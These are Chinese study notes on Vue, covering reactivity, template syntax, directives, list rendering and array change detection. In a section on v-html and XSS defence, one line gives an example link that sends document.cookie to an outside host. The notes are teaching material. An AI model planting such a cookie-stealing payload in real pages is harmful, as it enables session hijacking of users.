# 千锋Vue学习笔记

[TOC]

## 写在前面

- 封面 | 摘要 | 关键词

  ![首页](https://img-blog.csdnimg.cn/c944cb785bb946898ed1a018ad717104.jpeg)

  千锋Vue学习笔记

  ```
  Vue
  李英俊
  前端
  千锋
  ```

- 学习链接

- 感想 | 摘抄

- 学习时遇到的问题

- 直通车

- <span style="color: skyblue; font-weight: bold">PS：相关工程代码都在 Github 上</span>

## 1. 前言

1. Vue是通过拦截变量的get和set方法，来进行监听和更新的
2. `Object.defineProperty`有以下缺点：
   1. 无法监听es6的Set、Map变化
   2. 无法监听Class类型的数据
   3. 属性的新加或者删除也无法监听
   4. 数组元素的增加和删除也无法监听
3. `:src`、`:class`这样的写法的完整写法是：`v-bind:src`
4. 同理，事件 `@click`绑定的完整写法是：`v-on:click`

## 2. 模板语法

1. 插值

   1. 文本：`{{}}`

   2. 纯HTML

      ```
      v-html，放置XSS, CSRF(
      	(1) 前端过滤
      	(2) 后台转义(<> &lt; &gt;)
      	(3) 给cookie加上属性http
      )
      
      <a href=javascript:location.href='http://www.baidu.com?cookie='+document.cookie>click</a>
      ```

   3. 表达式

2. 指令：是带有 `v-` 前缀的特殊属性

   - `v-bind`：动态绑定属性
   - `v-if`：动态创建/删除
     - `v-else`
     - `v-else-if`
     - `template v-if`：包装元素template不会被创建
   - `v-show`：动态显示/隐藏
   - `v-on:click`：绑定事件
   - `v-for`：遍历
   - `v-model`：双向绑定表单

3. 缩写

   1. `v-bind:src`：`:src`
   2. `v-on:click`：`@click`

4. 关于vue数据对象新增拦截属性的解决方案

   - vue2：
     - `Vue.set(vm.classobj, "dd", true)`
     - `Vue.set(vm.styleobj, "fontSize", "30px")`
   - vue3: 支持动态增加属性的拦截
   - **动态切换这里可以用对象，也可以用数组，用数组的时候vue两个版本都正常**
   - 注意：如果是直接操作 `:style` 的形式，需要按照js的语法去设置css，即需要用驼峰命名法

5. template是一个包装元素，可以控制子元素的同生共死，同时不会影响dom结构

6. 列表渲染

   1. `v-for`（特殊 v-for=“n in 10”）

      1. in
      2. of

      没有区别

   2. key

      1. 跟踪每个节点的身份，从而重用和重新排序现有元素
      2. 理想的key值是每项都有的且唯一的id，data.id

   3. 数组更新检测

      1. 使用以下方法操作数组，可以检测变动
         - `push`
         - `pop`
         - `shift`
         - `unshift`
         - `splice`
         - `soft`
         - `reverse`
   
      2. 新数组替换旧数组
         - `filter`
         - `concat`
         - `slice`
         - `map`

      3. 不能检测以下变动的数组

         ```
         vm.items[indexOfItem] = newValue
         ```

         *解决*：
   
         - `Vue.set(example1.items, indexOfItem, newValue)`
         - splice
   
      4. 应用：显示过滤结果
   
   4. 事件处理
   
      1. 监听事件-直接触发代码
      2. 方法事件处理器-写函数名 handleClick
   
   5. vue 操作dom底层，虚拟dom
   
      ![在这里插入图片描述](https://img-blog.csdnimg.cn/2785ead09eab41e688201be7a350a6ae.png)
   
      ![在这里插入图片描述](https://img-blog.csdnimg.cn/3ab4b9b9db954230a111a3118a7ea8f8.png)
   
   6. change和input的区别
   
      - change只有在输入框失去焦点，且内容发生改变时，才会触发函数






























------


- :cloud: 我的CSDN：`https://blog.csdn.net/qq_21579045/`
- :snowflake: 我的博客园：`https://www.cnblogs.com/lyjun/`
- :sunny: 我的Github：`https://github.com/TinyHandsome/`
- :rainbow: 我的bilibili：`https://space.bilibili.com/8182822/`
- :avocado: 我的思否：`https://segmentfault.com/u/liyj/`
- :tomato: 我的知乎：`https://www.zhihu.com/people/lyjun_/`
- :potato: 我的豆瓣：`https://www.douban.com/people/lyjun_/`
- :penguin: 粉丝交流群：1060163543，神秘暗号：为干饭而来

碌碌谋生，谋其所爱。:ocean:              @李英俊小朋友
